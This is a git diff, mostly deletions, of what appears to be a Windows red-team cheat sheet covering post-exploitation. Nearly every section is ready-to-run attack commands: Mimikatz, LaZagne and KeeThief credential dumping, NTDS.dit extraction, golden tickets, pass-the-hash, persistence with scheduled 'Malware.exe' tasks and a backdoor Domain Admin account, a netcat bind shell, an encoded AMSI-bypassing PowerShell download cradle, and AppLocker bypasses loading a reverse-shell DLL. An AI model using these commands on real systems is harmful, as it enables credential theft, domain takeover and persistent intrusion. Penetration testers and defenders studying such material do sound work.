-sekurlsa::logonPasswords all
-
-#Dump Cache
-
-lsadump::cache
-
-#Dump SAM
-
-lsadump::sam
-```
-
-
-
-Dump Creds #2
-
-```powershell
-#https://github.com/AlessandroZ/LaZagne
-
-laZagne.exe all
-laZagne.exe browsers
-laZagne.exe browsers -firefox
-
-```
-
-
-
-Dump Chrome Passwords (Also Post Exploit)
-
-```powershell
-#git clone https://github.com/rasta-mouse/CookieMonster
-
-CookieMonster creds
-CookieMonster.exe cookies -d [domain] -e 
-CookieMonster -a 
-
-Must be run in the context of the target users as chrome passwords are encrypted with DPAPI.
-
-Can also use Mimikatz for this.
-
-mimikatz dpapi::chrome /in:"C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data"
-
-mimikatz dpapi::chrome /in:"C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data" /unprotect
-
-mimikatz dpapi::chrome /in:"C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies" /unprotect
-```
-
-
-
-Dump KeePass
-
-```powershell
-#https://github.com/HarmJ0y/KeeThief
-#http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/
-
-Get-Process keepass
-tasklist | findstr keepass
-
-Attacking KeePass
-
-#https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1
-Import-Module KeeThief.ps1
-Get-KeePassDatabaseKey -Verbose
-
-KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll & KeePatched.exe can also be used.
-```
-
-
-
-pypykatz
-
-```
-#https://github.com/skelsec/pypykatz
-
-Full python implementation of Mimikatz :D 
-
-pip3 install pypykatz
 ```
 
 
 
 SafetyKatz
 
-```powershell
+```
 #https://github.com/GhostPack/SafetyKatz
 
-Full C Sharp Implemenatation of Mimikatz that can be reflectively loaded :D 
+Full C# Implemenatation of Mimikatz that can be reflectively loaded :D 
 
-"SafetyKatz is a combination of slightly modified version of @gentilkiwis Mimikatz project and @subtee's .NET PE Loader.
+"SafetyKatz is a combination of slightly modified version of @gentilkiwi's Mimikatz project and @subtee's .NET PE Loader.
 
-First, the MiniDumpWriteDump Win32 API call is used to create a minidump of LSASS to C:\Windows\Temp\debug.bin. Then @subtees PELoader is used to load a customized version of Mimikatz that runs sekurlsa::logonpasswords and sekurlsa::ekeys on the minidump file, removing the file after execution is complete."
-```
-
-
-
-SharpDPAPI
-
-```powershell
-#https://github.com/GhostPack/SharpDPAPI
-
-Full C Sharp Implementation of Mimikatzs DPAPI features which allows access to DPAPI features.
+First, the MiniDumpWriteDump Win32 API call is used to create a minidump of LSASS to C:\Windows\Temp\debug.bin. Then @subtee's PELoader is used to load a customized version of Mimikatz that runs sekurlsa::logonpasswords and sekurlsa::ekeys on the minidump file, removing the file after execution is complete."
 ```
 
 
 
 Check for Missing KB's
 
-```powershell
+```
 watson.exe
 Sherlock.ps1
 
@@ -1353,153 +936,8 @@ https://github.com/rasta-mouse/Watson
 
 Decrypt EFS Files with Mimikatz if Admin/System
 
-```powershell
-#https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
-
-cipher /c "d:\Users\Gentil Kiwi\Documents\m0chan.txt" - View if File is EFS Encrypted and whom can Decrypt, sometimes Impersonating a token is easier than manually decrying with mimikatz.
-
-privilege::debug 
-token::elevate 
-crypto::system /file:"D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\B53C6DE283C00203587A03DD3D0BF66E16969A55" /export
-
-dpapi::capi /in:"D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b"
-
-dpapi::masterkey /in:"D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Protect\S-1-5-21-494464150-3436831043-1864828003-1001\1eccdbd2-4771-4360-8b19-9d6060a061dc" /password:waza1234/
-
-dpapi::capi /in:"D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b" /masterkey:f2c9ea33a990c865e985c496fb8915445895d80b
-
-openssl x509 -inform DER -outform PEM -in B53C6DE283C00203587A03DD3D0BF66E16969A55.der -out public.pem
-
-openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_ffb75517-bc6c-4a40-8f8b-e2c555e30e34.pvk -out private.pem
-
-openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
-
-certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot
 ```
 
-
-
-UAC Bypass
-
-```
-https://egre55.github.io/system-properties-uac-bypass/ - Read Ghoul writeup on HTB for more Info 
-
-findstr /C:"<autoElevate>true" 
-
-C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
-C:\Windows\SysWOW64\SystemPropertiesComputerName.exe
-C:\Windows\SysWOW64\SystemPropertiesHardware.exe
-C:\Windows\SysWOW64\SystemPropertiesProtection.exe
-C:\Windows\SysWOW64\SystemPropertiesRemote.exe
-```
-
-
-
-Golden Ticket Attack
-
-```powershell
-#Check my Blog Post Kerberos Attacks in Depth for Further Information
-#https://m0chan.github.io/Kerberos-Attacks-In-Depth
-
-# To generate the TGT with NTLM
-mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>
-
-# To generate the TGT with AES 128 key
-mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>
-
-# To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
-mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>
-
-# Inject TGT with Mimikatz
-mimikatz # kerberos::ptt <ticket_kirbi_file>
-
-
-#Inject Ticket with Rebeus
-.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
-
-.\PsExec.exe -accepteula \\<remote_hostname> cmd
-```
-
-
-
-Child Domain to Forest Compromise
-
-```powershell
-Domain = Logical group of objects (users, computers, servers etc etc) supported from a central location like a DC
-
-Tree = Set of domains using same name space (DNS Name)
-
-Trust = Agreement between 2 domains that allow cross-domain access to resources etc. i/e Michelle@dev.m0chan.com may be able to access resources inside HR.m0chan.com.
-
-Forest = Largest Structure composed of all trees.
-
-Most trees are linked with dual sided trust relationships to allow for sharing of resources.
-
-By default the first domain created if the Forest Root.
-
-Lets say we have owned a domain controller and got the KRBTGT Hash (The keys to the castle) we can now create 
-
-Covert-NameToSid target.domain.com\krbtgt
-S-1-5-21-2941561648-383941485-1389968811-502
-
-Replace 502 with 519 to represent Enterprise Admins
-
-Create golden ticket and attack parent domain. 
-
-
-This will not work if there is SID Filtering in place for respective target domain.
-
-harmj0ys article explains it best. 
-
-#http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/
-```
-
-
-
-Dump NTDS.dit
-
-```powershell
-C:\vssadmin create shadow /for=C:
-copy \\?
-\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\ntds\ntds.dit
-.
-copy \\?
-\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SYSTEM
-.
-copy \\?
-\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SAM
-.
-reg SAVE HKLM\SYSTEM c:\SYS
-vssadmin delete shadows /for= [/oldest | /all | /shadow=]
-
-
-If you pwn a BackupOperator account with SeBackupPrivilege you can also dump NTDS.dit
-```
-
-
-
-SeBackupPrivlege - Dump NTDS.dit
-
-```powershell
-Import-Module .\SeBackupPrivilegeCmdLets.dll
-Import-Module .\SeBackupPrivilegeUtils.dll
-
-PS C:\m0chan> Get-SeBackupPrivilege
-SeBackupPrivilege is disabled
-
-PS C:\m0chan> Set-SeBackupPrivilege
-
-PS C:\m0chan> Get-SeBackupPrivilege
-SeBackupPrivilege is enabled
-
-PS C:\m0chan> Copy-FileSeBackupPrivilege P:\Windows\System32\ntds.dit C:\m0chan\ntds.dit -Overwrite
-Copied 12582912 bytes
-
-Use diskshadow to mount a shadow copy and then copy Windows\system32\ntds.dit 
-
-Remember and not use C:\Windows\ntds\ntds.dit
-
-reg.exe save hklm\system c:\m0chan\SYSTEM.bak
 ```
 
 
@@ -1515,107 +953,6 @@ SSH Shuttle
 ```
 
 
-
-AutoRun Registry
-
-```
-[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
-[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce]
-[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices]
-[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]
-[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]
-
-[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
-[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce]
-[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices]
-[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]
-[HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]
-```
-
-
-
-Run & Run Once
-
-```
-reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate
-/t REG_SZ /d "C:\Temp\SoftwareUpdate\Malware.exe"
-```
-
-
-
-Scheduled Tasks
-
-```
-#Note - Beaware. some EDR/Endpoint Solutions detect Scheduled Tasks being created and trigger alerts.
-
-schtasks /create /sc minute /mo 1 /tn "Malware" /tr C:\Temp\SoftwareUpdate\Malware.exe
-
-This will run Malware.exe every minute forever.
-
-# Run Malware.exe every day at 06:00am
-schtasks /create /tn "SoftwareUpdate" /tr C:\Temp\SoftwareUpdate\Malware.exe /sc daily /st 06:00
-
-# Runs a task each time the user's session is idle for 5 minutes.
-schtasks /create /tn "SoftwareUpdate" /tr C:\Temp\SoftwareUpdate\Malware.exe /sc onidle /i 5
-
-# Runs a a task as SYSTEM when User Logs in.
-schtasks /create /ru "NT AUTHORITY\SYSTEM" /rp "" /tn "SoftwareUpdate" /tr C:\Temp\SoftwareUpdate\Malware.exe /sc onlogon
-```
-
-
-
-Windows Startup Folder 
-
-```
-This has been around for years as basically every version of Windows contains a startup folder. 
-
-Windows 10 - C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
-
-Current User Startup - C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-```
-
-
-
-EXE/DLL Hijacking
-
-```
-Look for any missing DLL's or EXE's that common programs are calling on startup and over write them with your payload/malware.
-
-Also if you are localadmin/system you could provide over write a normal service binary or DLL, providing you don't break the execution.
-```
-
-
-
-Add User Account
-
-```
-net user m0chan /add /domain
-net group "Domain Admins" m0chan /add /domain
-net localgroup "Administrators" /add
-net user m0chan /domain /comment:"Your Blueteam Fucking Sucks"
-```
-
-
-
-Persistence with Kerberos
-
-```
-We can dump Kerberos tickets and inject them in session when deemed relevant however tickets have a low life span unless explically requested for 7 days. 
-
-They can be injected into session with mimikatz or Rebeus. 
-
-But let's say we have pwned a DC and got the KRBTGT Hash we can generate a golden ticket with a 10 year life span.
-
-kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:utilisateur.chocolate.kirbi 
-
-SID is the domain SID
-
-Inject Ticket
-
-kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi
-
-Can also inject kirbi with Rebeus
-```
 
 
 
@@ -1635,66 +972,9 @@ ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
 
 
 
-Powershell Port Forward
-
-```powershell
-netsh interface portproxy add v4tov4 listenport=fromport listenaddress=fromip connectport=toport connectaddress=toip
-
-Permanent ^^
-
-fromport: the port number to listen on, e.g. 80
-fromip: the ip address to listen on, e.g. 192.168.1.1
-toport: the port number to forward to
-toip: the ip address to forward to
-```
-
-
-
-Socat for Windows
-
-```powershell
-#https://github.com/StudioEtrange/socat-windows
-
-Generate SSL Cert for Encryption
-openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.key
-
-Server : socat OPENSSL-LISTEN:443,cert=/cert.pem -
-Client : socat - OPENSSL:localhost:443
-
-#Port Forward
-
-socat OPENSSL-LISTEN:443,cert=/cert.pem,fork TCP:202.54.1.5:443
-
-All SSL Connections will be redirected to 202.54.1.5:443
-
-#Non SSL Port Forward
-socat TCP-LISTEN:80,fork TCP:202.54.1.5:80
-```
-
-
-
-Secure Sockets Funneling
-
-```powershell
-#https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html#ssf
-#git clone https://github.com/securesocketfunneling/ssf.git
-
-Massive shout out to 0xdf for explaining this perfectly in his article. Couldnt have done it better myself. 
-```
-
-
-
-Chisel (Fast TCP Tunnel over HTTP secured by SSH)
-
-```powershell
-#https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html
-```
-
-
-
 CrackMapExec
 
-```powershell
+```
 #https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-lateral-movement/
 ```
 
@@ -1702,7 +982,7 @@ CrackMapExec
 
 WMIC Spawn Process
 
-```powershell
+```
 wmic /node:WS02 /user:DOMAIN\m0chan /password:m0chan process call create "powershell.exe -Enc aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ARwBvAG8AZABuAGkAZwBoAHQALgBwAHMAMQAiACkAKQA7ACAAaQBmACgAWwBCAHkAcABhAHMAcwAuAEEATQBTAEkAXQA6ADoARABpAHMAYQBiAGwAZQAoACkAIAAtAGUAcQAgACIAMAAiACkAIAB7ACAAaQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA2AC8ASABSAEUAdgBlAG4AdABzAC4AcABzADEAIgApACkAIAB9AA=="
 ```
 
@@ -1710,11 +990,11 @@ wmic /node:WS02 /user:DOMAIN\m0chan /password:m0chan process call create "powers
 
 Invoke-WMIExec.ps1
 
-```powershell
+```
 Invoke-WMIExec -Target 10.10.14.14 -Username rweston_da -Hash 3ff61fa259deee15e4042159d
 7b832fa -Command "net user user pass /add /domain"
 
-PS C:\users\user\Downloads> Invoke-WMIExec -Target 10.10.120.1 -Username m0chan -Hash 3ff61fa259deee15e4042159d
+PS C:\users\epugh_adm\Downloads> Invoke-WMIExec -Target 10.10.120.1 -Username m0chan -Hash 3ff61fa259deee15e4042159d
 7b832fa -Command "net group ""Domain Admins"" m0chan /add /domain"
 ```
 
@@ -1722,7 +1002,7 @@ PS C:\users\user\Downloads> Invoke-WMIExec -Target 10.10.120.1 -Username m0chan 
 
 Powershell Invoke-Command (Requires Port 5985)
 
-```powershell
+```
 $secpasswd = ConvertTo-SecureString 'pass' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('m0chan\user', $secpasswd)
 
@@ -1741,7 +1021,7 @@ psexec.exe \\dc01.m0chanAD.local cmd.exe
 
 Powershell Remoting
 
-```powershell
+```
 $secpasswd = ConvertTo-SecureString 'password' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('WS02\USER', $secpasswd)
 
@@ -1749,219 +1029,3 @@ $Session = New-PSSession -ComputerName FileServer -Credential $cred
 Enter-PSSession $Session
 ```
 
-
-
-Configure Remote Service over SMB (Requires Local Admin on Target Machine)
-
-```powershell
-net use \\192.168.0.15 [password] /u:DOMAIN\m0chan
-
-sc \\192.168.0.15 create <service_name> binpath= "cmd.exe /k COMMAND"
-sc \\192.168.0.15 create <service_name> binpath= "cmd.exe /k <c:\tools\nc.exe -L -p <port> -e cmd.exe>"
-sc \\192.168.0.15 start <service_name>
-```
-
-
-
-
-
-Pass-The-Hash
-
-```powershell
-crackmapexec <ip> -u <user> -H "<lm>" -x "<msfvenom psh-cmd>"
-
-impacket-wmiexec <user>@<ip> -hashes <lm:nt>
-
-pth-winexe -U <user>%<ntlm> //<ip> "<msfvenom psh-cmd>"
-
-python wmiexec.py -hashes :<hash> <user>@<ip>
-
-xfreerdp /u:<user> /d:<domain> /pth:<ntlm> /v:<ip>:3389 /dynamic-resolution
-
-sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
-```
-
-
-
-Pass-The-Ticket
-
-```powershell
-#Check my Blog Post Kerberos Attacks in Depth for Further Information
-#https://m0chan.github.io/Kerberos-Attacks-In-Depth
-
-Rebeus monitor /interval:30 
-
-Monitoring logon sessions every 30 seconds so I can pinch Kerb tickets
-
-Reubus will now give you a Kerberos ticket in base64 which you can pass with
-
-Rubeus.exe ptt /ticket:[base64blobhere]
-
-We can now request TGS service tickets to access network resources as this user
-```
-
-
-
-## [](#header-2)Obfuscation Techniques 
-
-
-
-Invoke-Obfusaction
-
-```powershell.exe
-#https://github.com/danielbohannon/Invoke-Obfuscation
-
-Can obfusacte Scripts & Commands 
-
-Obfusacte script from remote url 
-
-SET SCRIPTPATH https://thisdosentexist.m0chan.com/Invoke-Mimikatz.ps1
-
-Can also set Sscript block base64 PS
-
-SET SCRIPTBLOCK powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAWQBvAHUAIABjAGEAbgAgAHUAcwBlACAAYgBhAHMAaQBjACAALQBlAG4A==
-```
-
-
-
-Invoke-CradleCraft
-
-```
-#https://github.com/danielbohannon/Invoke-CradleCrafter
-
-Similar to Invoke-Obfusaction but allows you to obfusacte cradles for downloading i/e
-
-IEX (New-Object Net.WebClient).DownloadString('http://c2server.com/Invoke-Mimikatz.ps1')
-
-
-```
-
-
-
-Invoke-DOSfuscation
-
-```
-#https://github.com/danielbohannon/Invoke-DOSfuscation
-```
-
-
-
-## [](#header-2)AppLocker / Constrained Mode Bypasses
-
-
-
-Verify is you are in constrained mode
-
-```
-$ExecutionContext.SessionState.LanguageMode
-```
-
-
-
-PowershellVeryLess Bypass
-
-```powershell
-git clone https://github.com/decoder-it/powershellveryless.git
-
-
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll 
-/out:C:\Users\m0chan\Scripts\powershellveryless.exe 
-
-
-
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll /out:c:\setup\powershellveryless.exe c:\scripts\powershellveryless.cs
-
-
-Execute -> powershellveryless.exe script.ps1
-
-script.ps1 = Script of your Choice
-```
-
-
-
-World Writable Folders (By Default on Windows 10 1803) - Shoutout to api0cradle.
-
-```powershell
-#https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
-
-C:\Windows\Tasks 
-C:\Windows\Temp 
-C:\windows\tracing
-C:\Windows\Registration\CRMLog
-C:\Windows\System32\FxsTmp
-C:\Windows\System32\com\dmp
-C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
-C:\Windows\System32\spool\PRINTERS
-C:\Windows\System32\spool\SERVERS
-C:\Windows\System32\spool\drivers\color
-C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
-C:\Windows\SysWOW64\FxsTmp
-C:\Windows\SysWOW64\com\dmp
-C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
-C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
-```
-
-
-
-Downgrade Attack
-
-```powershell
-Downgrading to PS Version 2 circumvates AppLocker
-
-powershell.exe -version 2
-
-Verifiy versions with $PSVersionTable
-Get-Host
-```
-
-
-
-AppLocker COR Profile Bypass
-
-```
-set COR_ENABLE_PROFILING=1
-COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
-set COR_PROFILER_PATH=C:\Users\m0chan\pwn\reverseshell.dll
-tzsync
-powershell
-
-Where .DLL is your payload i/e reverse shell, beacon etc. 
-```
-
-
-
-MSBuild Powershell/CMD Bypass
-
-```powershell
-You can use this if cmd is not disabled but powershell is
-
-https://github.com/Cn33liz/MSBuildShell/blob/master/MSBuildShell.csproj
-
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe pshell.csproj
-
-Also https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c
-
-MSBuild PSAttack :D :D 
-```
-
-
-
-PSAttack
-
-```powershell
-#https://github.com/jaredhaight/PSAttack
-
-Use if Powershell.exe is not available. this does not rely on powershell.exe, but Instead directly calls powershell through .NET Framework circumvating most application whitelisting etc.
-
-Has numerous modules prebuilt in and is built in C Sharp / .NET so can be reflectively loaded :)
-```
-
-
-
-NoPowerShell
-
-```powershell
-#https://github.com/bitsadmin/nopowershell
-
-Primiarily to be used with Cobalt & Execute Assembly but can also be reflectively loaded from any other C2 infra.
-```
